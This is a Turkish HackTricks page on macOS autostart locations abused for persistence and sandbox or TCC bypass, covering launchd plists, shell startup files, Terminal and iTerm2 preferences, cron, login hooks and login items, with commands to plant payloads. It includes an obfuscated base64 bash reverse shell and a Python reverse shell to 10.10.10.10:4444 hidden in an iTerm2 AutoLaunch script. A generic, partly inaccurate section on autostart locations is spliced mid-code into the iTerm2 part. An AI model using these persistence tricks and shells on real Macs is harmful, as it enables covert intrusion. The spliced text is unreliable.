# macOS Otomatik Başlatma

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

Bu bölüm, [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) blog serisine dayanmaktadır. Amacı, **Daha Fazla Otomatik Başlatma Konumu** eklemek (mümkünse), günümüzdeki macOS'ın en son sürümü (13.4) ile hala çalışan **hangi tekniklerin** olduğunu belirtmek ve gerekli olan **izinleri** belirtmektir.

## Kum Havuzu Atlama

{% hint style="success" %}
Burada, **kum havuzu atlamaya** yararlı olan başlatma konumlarını bulabilirsiniz. Bu, bir dosyaya **yazarak** ve bir kum havuzu içinden genellikle **kök izinlere ihtiyaç duymadan** belirli bir **zaman** veya **genellikle gerçekleştirebileceğiniz bir eylem** için çok **ortak bir eylem** veya **belirli bir süre** bekleyerek basitçe bir şeyi **yürütmenize izin verir**.
{% endhint %}

### Launchd

* Kum havuzu atlaması için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC Atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

* **`/Library/LaunchAgents`**
* **Tetikleyici**: Yeniden başlatma
* Kök izni gereklidir
* **`/Library/LaunchDaemons`**
* **Tetikleyici**: Yeniden başlatma
* Kök izni gereklidir
* **`/System/Library/LaunchAgents`**
* **Tetikleyici**: Yeniden başlatma
* Kök izni gereklidir
* **`/System/Library/LaunchDaemons`**
* **Tetikleyici**: Yeniden başlatma
* Kök izni gereklidir
* **`~/Library/LaunchAgents`**
* **Tetikleyici**: Yeniden oturum açma
* **`~/Library/LaunchDemons`**
* **Tetikleyici**: Yeniden oturum açma

#### Açıklama ve Sömürü

**`launchd`**, başlangıçta OX S çekirdeği tarafından yürütülen **ilk işlem** ve kapanırken sonuncusudur. Her zaman **PID 1**'e sahip olmalıdır. Bu işlem, **ASEP** **plistlerinde** belirtilen yapılandırmaları **okuyacak ve yürütecektir**:

* `/Library/LaunchAgents`: Yönetici tarafından yüklenen kullanıcı başına ajanlar
* `/Library/LaunchDaemons`: Yönetici tarafından yüklenen sistem genelindeki daemonlar
* `/System/Library/LaunchAgents`: Apple tarafından sağlanan kullanıcı başına ajanlar.
* `/System/Library/LaunchDaemons`: Apple tarafından sağlanan sistem genelindeki daemonlar.

Bir kullanıcı oturum açtığında, `/Users/$USER/Library/LaunchAgents` ve `/Users/$USER/Library/LaunchDemons` konumlarındaki plist'ler, **oturum açan kullanıcı izinleriyle** başlatılır.

**Ajanlar ve daemonlar arasındaki temel fark, ajanların kullanıcı oturum açtığında yüklenmesi ve daemonların sistem başlatıldığında yüklenmesidir** (çünkü ssh gibi hizmetlerin, herhangi bir kullanıcının sisteme erişmeden önce yürütülmesi gerektiği durumlar vardır). Ayrıca ajanlar GUI kullanabilirken, daemonlar arka planda çalışmalıdır.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
**Kullanıcı oturum açmadan önce bir ajanın çalıştırılması gereken durumlar** bulunmaktadır, bunlara **PreLoginAgents** denir. Örneğin, bu, oturum açılırken destekleyici teknoloji sağlamak için kullanışlıdır. Bunlar ayrıca `/Library/LaunchAgents` dizininde de bulunabilir (bir örnek için [**buraya**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) bakın).

{% hint style="info" %}
Yeni Daemon'lar veya Ajan'lar yapılandırma dosyaları **bir sonraki yeniden başlatmadan sonra veya** `launchctl load <hedef.plist>` **kullanılarak yüklenecektir**. Ayrıca, `.plist` uzantısız dosyaları da `launchctl -F <dosya>` ile yüklemek mümkündür (ancak bu plist dosyaları otomatik olarak yeniden başlatma sonrasında yüklenmeyecektir).\
`launchctl unload <hedef.plist>` ile **yüklemenin** de mümkün olduğuna dikkat edin (bu işaret ettiği işlem sonlandırılacaktır).

Bir **Ajanın** veya **Daemon'ın** **çalışmasını engelleyen** bir **geçersiz kılma** gibi **herhangi bir şeyin olmadığından emin olmak için** şunu çalıştırın: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
{% endhint %}

Mevcut kullanıcı tarafından yüklenen tüm ajanları ve daemonları listele:
```bash
launchctl list
```
{% hint style="warning" %}
Eğer bir plist dosyası bir kullanıcıya aitse, hatta daemon sistem genelindeki klasörlerde olsa bile, **görev kullanıcı olarak** ve kök olarak değil yürütülecektir. Bu bazı ayrıcalık yükseltme saldırılarını engelleyebilir.
{% endhint %}

### kabuk başlangıç dosyaları

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Açıklama (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC Atlatma: [✅](https://emojipedia.org/check-mark-button)
* Ancak bu dosyaları yükleyen bir kabuk yürüten TCC atlatması olan bir uygulama bulmanız gerekmektedir

#### Konumlar

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Tetikleyici**: zsh ile bir terminal aç
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Tetikleyici**: zsh ile bir terminal aç
* Kök gereklidir
* **`~/.zlogout`**
* **Tetikleyici**: zsh ile bir terminalden çık
* **`/etc/zlogout`**
* **Tetikleyici**: zsh ile bir terminalden çık
* Kök gereklidir
* Muhtemelen daha fazlası: **`man zsh`**
* **`~/.bashrc`**
* **Tetikleyici**: bash ile bir terminal aç
* `/etc/profile` (çalışmadı)
* `~/.profile` (çalışmadı)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Tetikleyici**: xterm ile tetiklenmesi beklenir, ancak **kurulu değil** ve kurulduktan sonra bile bu hata alınır: xterm: `DISPLAY is not set`

#### Açıklama ve Sömürü

`zsh` veya `bash` gibi bir kabuk ortamı başlatıldığında, **belirli başlangıç dosyaları çalıştırılır**. macOS şu anda varsayılan kabuk olarak `/bin/zsh` kullanmaktadır. Bu kabuk, Terminal uygulaması başlatıldığında veya bir cihaz SSH ile erişildiğinde otomatik olarak erişilir. `bash` ve `sh` de macOS'ta bulunmasına rağmen, kullanılmak için açıkça çağrılması gerekir.

`man zsh` ile okuyabileceğimiz zsh'in man sayfası, başlangıç dosyalarının uzun bir açıklamasına sahiptir.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Yeniden Açılan Uygulamalar

{% hint style="danger" %}
Belirtilen açığı yapılandırmak ve oturumu kapatıp açmak veya hatta yeniden başlatmak, uygulamayı çalıştırmam için işe yaramadı. (Uygulama çalıştırılmıyordu, belki de bu işlemler yapılırken uygulamanın çalışıyor olması gerekiyor)
{% endhint %}

**Açıklama**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Kum havuzunu atlamak için faydalı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Tetikleyici**: Uygulamaları yeniden açma işlemi

#### Açıklama ve Sömürü

Yeniden açılacak tüm uygulamalar, `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` içinde bulunmaktadır.

Bu nedenle, yeniden açılacak uygulamalar arasına kendi uygulamanızı eklemek için sadece **uygulamanızı listeye eklemeniz yeterlidir**.

UUID, bu dizini listelerken veya `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` komutu ile bulunabilir.

Yeniden açılacak uygulamaları kontrol etmek için şunu yapabilirsiniz:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
**Bu listeye bir uygulama eklemek için** şunları kullanabilirsiniz:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Tercihleri

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
* Terminal, kullanıcının FDA izinlerine sahip olmasını gerektirir.

#### Konum

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Tetikleyici**: Terminalı Aç

#### Açıklama ve Sömürü

**`~/Library/Preferences`** içerisinde, Kullanıcı Tercihleri Uygulamalarında saklanır. Bu tercihlerin bazıları, **diğer uygulamalar/skriptleri çalıştırmak** için bir yapılandırma tutabilir.

Örneğin, Terminal Başlangıçta bir komutu çalıştırabilir:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Bu yapılandırma, **`~/Library/Preferences/com.apple.Terminal.plist`** dosyasında şu şekilde yansıtılır:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Yani, sistemdeki terminalin tercihlerinin plist'i üzerine yazılırsa, **`open`** işlevi kullanılarak **terminal açılabilir ve o komut çalıştırılabilir**.

Bunu terminalden şu şekilde ekleyebilirsiniz:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Terminal Betikleri / Diğer dosya uzantıları

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
* Terminal, kullanıcının FDA izinlerine sahip olmasını gerektirir

#### Konum

* **Herhangi bir yer**
* **Tetikleyici**: Terminali Aç

#### Açıklama ve Sömürü

Eğer bir [**`.terminal`** betiği](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) oluşturursanız ve açarsanız, **Terminal uygulaması** otomatik olarak çağrılacak ve içinde belirtilen komutları yürütmek için kullanılacaktır. Eğer Terminal uygulamasının özel izinleri varsa (örneğin TCC gibi), komutunuz bu özel izinlerle çalıştırılacaktır.

Denemek için:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
### Ses Eklentileri

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Açıklama: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlatma: [🟠](https://emojipedia.org/large-orange-circle)
* Bazı ek TCC erişimine sahip olabilirsiniz

#### Konum

* **`/Library/Audio/Plug-Ins/HAL`**
* Kök erişimi gereklidir
* **Tetik**: coreaudiod veya bilgisayar yeniden başlatılmalıdır
* **`/Library/Audio/Plug-ins/Components`**
* Kök erişimi gereklidir
* **Tetik**: coreaudiod veya bilgisayar yeniden başlatılmalıdır
* **`~/Library/Audio/Plug-ins/Components`**
* **Tetik**: coreaudiod veya bilgisayar yeniden başlatılmalıdır
* **`/System/Library/Components`**
* Kök erişimi gereklidir
* **Tetik**: coreaudiod veya bilgisayar yeniden başlatılmalıdır

#### Açıklama

Önceki açıklamalara göre **bazı ses eklentilerini derleyip** yüklemek mümkündür.

### QuickLook Eklentileri

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlatma: [🟠](https://emojipedia.org/large-orange-circle)
* Bazı ek TCC erişimine sahip olabilirsiniz

#### Konum

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Açıklama ve Sömürü

QuickLook eklentileri, bir dosyanın önizlemesini **tetiklediğinizde** (Finder'da dosya seçiliyken boşluk çubuğuna basın) ve **o dosya türünü destekleyen bir eklenti** yüklü olduğunda çalıştırılabilir.

Kendi QuickLook eklentinizi derleyip, bunu önceki konumlardan birine yerleştirerek yükleyebilir ve ardından desteklenen bir dosyaya gidip tetiklemek için boşluk tuşuna basabilirsiniz.

### ~~Giriş/Çıkış Kancaları~~

{% hint style="danger" %}
Bu benim için çalışmadı, ne kullanıcı GirişKancası ne de kök ÇıkışKancası ile.
{% endhint %}

**Açıklama**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` gibi bir şeyi yürütebilmelisiniz
* `~/Library/Preferences/com.apple.loginwindow.plist` konumunda bulunur

Eskimiş olsalar da, bir kullanıcı oturum açtığında komutları yürütmek için kullanılabilirler.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Bu ayar `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` dosyasında saklanır.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Silmek için:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Root kullanıcısı **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** dosyasında saklanır.

## Koşullu Kum Sandığı Atlatma

{% hint style="success" %}
Burada, **kum sandığı atlatma** için yararlı olan başlangıç konumlarını bulabilirsiniz, bu da size bir şeyi **bir dosyaya yazarak** ve belirli **programlar yüklü, "sıradışı" kullanıcı** eylemleri veya ortamları gibi belirli **olağandışı koşulların olmadığını bekleyerek** basitçe yürütmenizi sağlar.
{% endhint %}

### Cron

**Açıklama**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Kum sandığını atlamak için yararlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak, `crontab` ikilisini yürütebilmelisiniz
* Veya root olmalısınız
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Doğrudan yazma erişimi için root gereklidir. `crontab <dosya>`yı yürütebiliyorsanız root gerekli değildir
* **Tetikleyici**: Cron işine bağlıdır

#### Açıklama ve Sömürü

**Mevcut kullanıcının** cron işlerini listelemek için:
```bash
crontab -l
```
Kullanıcıların tüm cron işlerini **`/usr/lib/cron/tabs/`** ve **`/var/at/tabs/`** (root gerektirir) dizinlerinde görebilirsiniz.

MacOS'ta belirli bir sıklıkla betikleri çalıştıran birkaç klasör bulunabilir:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Burada düzenli **cron işleri**, **at işleri** (pek kullanılmaz) ve **periyodik işler** (genellikle geçici dosyaları temizlemek için kullanılır) bulabilirsiniz. Günlük periyodik işler örneğin şu şekilde çalıştırılabilir: `periodic daily`.

**Kullanıcı cron işi programatik olarak eklemek** için şu kullanılabilir:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
* iTerm2, TCC izinlerine sahip olabilir

#### Konumlar

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Tetikleyici**: iTerm açılınca
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Tetikleyici**: iTerm açılınca
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Tetikleyici**: iTerm açılınca

#### Açıklama ve Sömürü

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** konumunda depolanan betikler çalıştırılacaktır. Örneğin:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
## macOS Otomatik Başlatma Konumları

macOS'ta, oturum açtığınızda başlatılan uygulamaları belirleyen çeşitli konumlar vardır. Bu konumlar, kullanıcı oturum açtığında otomatik olarak başlatılacak uygulamaları tanımlamanıza olanak tanır. Aşağıda, macOS'ta otomatik başlatma konumlarının bir listesi bulunmaktadır:

### Kullanıcı Otomatik Başlatma Konumları

1. **Login Items**: Sistem Tercihleri > Kullanıcılar ve Gruplar > Giriş Öğeleri
2. **Launch Agents**: `~/Library/LaunchAgents/`
3. **Launch Daemons**: `/Library/LaunchDaemons/`
4. **Login Hooks**: `/Library/Security/SecurityAgentPlugins/`

### Sistem Otomatik Başlatma Konumları

1. **Startup Items**: `/Library/StartupItems/` (macOS Catalina ve sonrasında desteklenmemektedir)
2. **Launch Agents**: `/Library/LaunchAgents/` ve `/System/Library/LaunchAgents/`
3. **Launch Daemons**: `/Library/LaunchDaemons/` ve `/System/Library/LaunchDaemons/`
4. **Startup Scripts**: `/etc/rc.common` ve `/etc/rc.local`

Bu konumlar, macOS'ta otomatik başlatma yapılandırmalarını denetlemek ve gerektiğinde istenmeyen uygulamaları devre dışı bırakmak için kullanılabilir.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Betik **`~/Kütüphane/Uygulama Desteği/iTerm2/Scripts/AutoLaunch.scpt`** de yürütülecektir:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** konumundaki iTerm2 tercihleri, iTerm2 terminali açıldığında **çalıştırılacak bir komutu belirtebilir**.

Bu ayar, iTerm2 ayarlarında yapılandırılabilir:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

Ve komut tercihlere yansıtılır:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Komutun çalıştırılacağı şekli ayarlayabilirsiniz:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
İTerm2 tercihlerini kötüye kullanmak için **başka yolların** olması muhtemeldir.
{% endhint %}

### xbar

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak xbar yüklü olmalı
* TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
* Erişilebilirlik izni istiyor

#### Konum

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Tetikleyici**: xbar çalıştırıldığında

#### Açıklama

Eğer popüler program [**xbar**](https://github.com/matryer/xbar) yüklü ise, xbar başlatıldığında çalıştırılacak olan bir kabuk betiği **`~/Library/Application\ Support/xbar/plugins/`** dizinine yazılabilir:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Açıklama**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak Hammerspoon yüklü olmalı
* TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
* Erişilebilirlik izinleri istiyor

#### Konum

* **`~/.hammerspoon/init.lua`**
* **Tetikleyici**: Hammerspoon çalıştırıldığında

#### Açıklama

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon), işlemleri için **LUA betik dili**ni kullanan **macOS** için bir otomasyon platformu olarak hizmet verir. Özellikle, tam AppleScript kodunun entegrasyonunu destekler ve kabuk betiklerinin yürütülmesini sağlayarak betikleme yeteneklerini önemli ölçüde artırır.

Uygulama, tek bir dosya olan `~/.hammerspoon/init.lua` dosyasını arar ve başlatıldığında betik yürütülür.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* Kullanışlıdır çünkü kum havuzunu atlar: [✅](https://emojipedia.org/check-mark-button)
* Ancak BetterTouchTool yüklü olmalıdır
* TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
* Otomasyon-Kısayolları ve Erişilebilirlik izinleri istiyor

#### Konum

* `~/Library/Application Support/BetterTouchTool/*`

Bu araç, bazı kısayollar basıldığında uygulamaları veya betikleri yürütmek için gösterge koymayı sağlar. Bir saldırgan, **kendi kısayolunu ve eylemini yürütmek için veritabanında yapılandırabilir** ve keyfi kod yürütebilir (bir kısayol sadece bir tuşa basmak olabilir).

### Alfred

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak Alfred yüklü olmalıdır
* TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
* Otomasyon, Erişilebilirlik ve hatta Tam Disk erişimi izinleri istiyor

#### Konum

* `???`

Belirli koşullar karşılandığında kodu yürütebilen iş akışları oluşturmayı sağlar. Bir saldırganın bir iş akışı dosyası oluşturup Alfred'ın bunu yüklemesini sağlaması mümkündür (iş akışlarını kullanmak için premium sürümü satın almak gerekmektedir).

### SSHRC

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Kum havuzunu atlamak için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
* Ancak ssh etkinleştirilmiş ve kullanılmış olmalıdır
* TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
* SSH'nin FDA erişimine sahip olması gerekmektedir

#### Konum

* **`~/.ssh/rc`**
* **Tetikleyici**: ssh üzerinden oturum açma
* **`/etc/ssh/sshrc`**
* Root gereklidir
* **Tetikleyici**: ssh üzerinden oturum açma

{% hint style="danger" %}
SSH'yi açmak için Tam Disk Erişimi gereklidir:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Açıklama ve Sömürü

Varsayılan olarak, `/etc/ssh/sshd_config` dosyasında `PermitUserRC no` belirtilmediği sürece, bir kullanıcı **SSH üzerinden giriş yaptığında** **`/etc/ssh/sshrc`** ve **`~/.ssh/rc`** betikleri çalıştırılacaktır.

### **Giriş Öğeleri**

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak `osascript`'i argümanlarla çalıştırmanız gerekmektedir
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Tetikleyici:** Giriş
* Sömürü yükü, **`osascript`**'i çağırarak depolanmıştır
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Tetikleyici:** Giriş
* Root gereklidir

#### Açıklama

Sistem Tercihleri -> Kullanıcılar ve Gruplar -> **Giriş Öğeleri**'nde, **kullanıcı oturum açtığında çalıştırılacak öğeleri** bulabilirsiniz.\
Onları komut satırından listelemek, eklemek ve kaldırmak mümkündür:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Bu öğeler dosyada **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** saklanır.

**Giriş öğeleri** ayrıca [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) API'si kullanılarak da belirtilebilir, bu da yapılandırmayı **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** konumunda saklayacaktır.

### ZIP olarak Giriş Öğesi

(Giriş Öğeleri hakkında önceki bölüme bakın, bu bir uzantıdır)

Eğer bir **ZIP** dosyasını bir **Giriş Öğesi** olarak saklarsanız, **`Archive Utility`** onu açacak ve örneğin ZIP dosyası **`~/Library`** konumunda saklanmış ve içinde **`LaunchAgents/file.plist`** adında bir arka kapı bulunduran bir Klasör içeriyorsa (varsayılan olarak bulunmaz), o klasör oluşturulacak ve plist eklenerek bir sonraki kullanıcı tekrar oturum açtığında, **plist'te belirtilen arka kapı yürütülecektir**.

